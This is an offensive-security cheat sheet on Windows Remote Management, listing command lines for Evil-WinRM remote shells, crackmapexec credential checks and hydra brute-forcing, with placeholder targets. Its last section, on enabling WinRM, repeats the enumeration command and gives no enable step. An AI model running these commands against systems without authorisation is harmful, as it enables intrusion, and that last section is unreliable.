**WinRM** (WindowsRemote Management) is a Windows-native protocol that allows remote management of machines using SOAP-based communication. It enables administrators to execute commands and scripts, manage services, and collect data from remote Windows devices.

## Evil-WinRM
`Evil-WinRM` can be used to connect to a Windows machine.

```bash
evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```

## Validating Access with WinRM  
To confirm valid credentials for WinRM, `crackmapexec` can be used.

```bash
crackmapexec winrm <target> -u <username> -p <password>
```

## Brute Force Attack on WinRM  
`hydra` can be used to perform brute force attacks on WinRM.

```bash
hydra -l <username> -P <password_list> winrm://<target_ip>
```

## Configuration Verification  
It can be checked if WinRM is configured and running on a Windows machine.

```bash
winrm enumerate winrm/config/listener
```

## Enable WinRM (Administrator Access Required)  
If you have administrative privileges, you can enable WinRM on the target machine.

```bash
winrm enumerate winrm/config/listener
```
